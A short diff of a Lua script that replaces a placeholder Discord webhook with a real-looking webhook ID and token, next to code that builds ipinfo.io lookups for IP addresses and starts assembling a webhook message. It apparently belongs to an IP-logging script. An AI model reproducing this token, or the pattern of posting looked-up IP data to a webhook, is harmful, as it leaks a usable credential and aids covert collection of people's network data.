@@ -96,7 +96,7 @@ local function generateIpInfoURL(ip)
     return "https://ipinfo.io/" .. ip
 end
 
-local webhookURL = "https://discord.com/api/webhooks/YourWebhookID/YourWebhookToken"
+local webhookURL = "https://discord.com/api/webhooks/1266074223860781077/BAGPJ7cOHg9FUTGTvfmtykQ4-fcv3h6CODdZ4Q-tWVTyYwwUdklZ761FUEG-OMKaEewb"
 local webhookData = {
     ["content"] = " ",
     ["embeds"] = {
